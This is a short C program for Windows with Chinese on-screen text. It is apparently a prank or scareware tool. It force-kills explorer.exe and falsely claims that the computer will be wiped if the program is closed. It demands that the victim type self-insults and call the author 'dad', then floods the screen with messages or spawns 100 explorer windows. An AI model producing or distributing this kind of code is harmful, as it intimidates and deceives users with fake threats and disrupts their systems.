#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<windows.h>
void over(void){
	int i;
	printf("\n\n\t\t你完了!!!");
	for(i = 0;i<10000;i++){
		printf("你完了!!! ");
		if(i%10==0) printf("\n");
	}
	Sleep(3000);
}
void son(void){
	int i;
   	system("cls");
   	printf("\n\n\t\t真听话！你可以滚了！\n");
	for(i = 0;i <100;i++)
		system("start explorer.exe");
}
int main()
{
	int i;
	char a[12],b[12] = {"我是蠢货"},c[12] = {"爸爸"},count = 0;
	system("taskkill/im explorer.exe /f");
	system("cls");
	printf("\n\n\t\t@蠢蛋!你中计了，如果你不按我说的做，你的电脑将会瘫痪！");
	loop:
		printf("\n\n\t\t如果你妄图关闭此程序,你的电脑将会被删除全部数据!!!\n");
		printf("\n\n\t\t$快说\"我是蠢货\",快给我在看不到汉字的情况下给我打出来，如果打不出来，你就完了！\n>>");
		scanf("%s",a);
		if(strcmp(a,b)==0){
			printf("\n\n\t\t$再叫句\"爸爸\",就放过你!\n>>");
			scanf("%s",a);
			if(strcmp(a,c)==0){
				son();
   				return 0;
			}
			else{
                printf("\n\n\t\t给你一次机会，叫\"爸爸\"!\n>>");
                scanf("%s",a);
                if(strcmp(a,c)==0){
					son();
   					return 0;
				}
					else over();
				}
		}
		    else if(count == 0){
				printf("\n\n\t\t$再给你一次机会!再不听话就给你点颜色看看!\n");
				count++;
				goto loop;
			}
				else over();
	return 0;
}
